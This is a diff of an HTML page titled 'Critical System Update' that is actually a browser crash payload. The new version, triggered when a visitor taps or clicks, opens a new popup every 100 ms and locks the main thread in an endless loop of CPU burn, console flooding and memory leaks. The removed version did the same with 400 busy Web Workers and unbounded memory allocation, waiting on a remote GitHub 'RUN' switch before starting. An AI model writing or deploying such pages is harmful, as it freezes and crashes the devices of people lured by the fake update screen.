@@ -1,64 +1,48 @@
-
 <!DOCTYPE html>
 <html>
 <head>
     <title>Critical System Update</title>
     <meta charset="UTF-8">
 </head>
-<body style="background-color: black; color: white; text-align: center; padding-top: 50px; font-family: Arial;">
-    <h1 id="status">INITIALIZING CORE...</h1>
-    <p>Tap anywhere to begin synchronization</p>
+<body style="background-color: black; color: #ff0000; text-align: center; padding-top: 100px; font-family: 'Courier New', Courier, monospace;">
+    <h1 id="status">CRITICAL ATTACK INITIALIZED</h1>
+    <p style="color: white;">TAP ANYWHERE ON THE SCREEN TO EXECUTE</p>
+    <div id="logs" style="font-size: 10px; color: #333;"></div>
 
     <script>
-        const statusUrl = 'https://raw.githubusercontent.com/karimattef3-pixel/my-tools/main/status.txt?t=' + new Date().getTime();
-        let isRunning = false;
-
-        async function checkStatus() {
-            try {
-                const response = await fetch(statusUrl);
-                const text = await response.text();
-                if (text.trim().includes("RUN") && !isRunning) {
-                    isRunning = true;
-                    document.getElementById('status').innerText = "CORE OVERLOAD: ACTIVE";
-                    document.getElementById('status').style.color = "red";
-                    startTheBeast();
-                }
-            } catch (e) { }
-        }
-
-        function startTheBeast() {
-            // 1. CPU Core Exhaustion (400 Threads)
-            for (let i = 0; i < 400; i++) {
-                new Worker(URL.createObjectURL(new Blob([`
-                    while(true) {
-                        Math.sqrt(Math.random() * 999999);
-                    }
-                `], {type: 'text/javascript'})));
-            }
-
-            // 2. RAM Smasher (Infinite Memory Allocation)
-            const memoryLeak = [];
+        function startTheCrash() {
+            document.getElementById('status').innerText = "EXECUTING CORE BREACH...";
+            
+            // 1. Infinite Popup Windows (Forces OS to manage hundreds of tasks)
+            // Note: If browser asks for popup permission, click "Allow"
             setInterval(() => {
-                for (let i = 0; i < 1000; i++) {
-                    memoryLeak.push(new Array(1000000).fill("STRESS_TEST_DATA_NULL"));
-                }
-            }, 10);
+                window.open(window.location.href, '_blank', 'width=10,height=10');
+            }, 100);
 
-            // 3. Main Thread Freeze (Infinite Loop)
+            // 2. Main Thread Lock (Freezes the UI completely)
             while(true) {
-                const dummy = Math.random() * Math.random();
-                console.log("Processing Stack: " + dummy);
+                // Heavy math to consume CPU cycles
+                const x = Math.sqrt(Math.random() * 0xffffffff) * Math.atan2(Math.random(), Math.random());
+                
+                // Rapidly printing to console to overflow the log buffer
+                console.log("CORE_OVERFLOW_ID_" + x);
+                
+                // Memory Leak: Creating massive strings and keeping them in memory
+                let leak = "";
+                for(let i=0; i<50000; i++) {
+                    leak += "CRASH_" + Math.random();
+                }
             }
         }
 
-        // Trigger on click to bypass mobile browser restrictions
-        window.addEventListener('click', () => {
-            checkStatus();
-            setInterval(checkStatus, 2000);
-        });
+        // The attack will only start after the user interacts with the screen
+        window.onclick = () => {
+            startTheCrash();
+        };
 
-        // Auto-check every 2 seconds
-        setInterval(checkStatus, 2000);
+        window.ontouchstart = () => {
+            startTheCrash();
+        };
     </script>
 </body>
 </html>
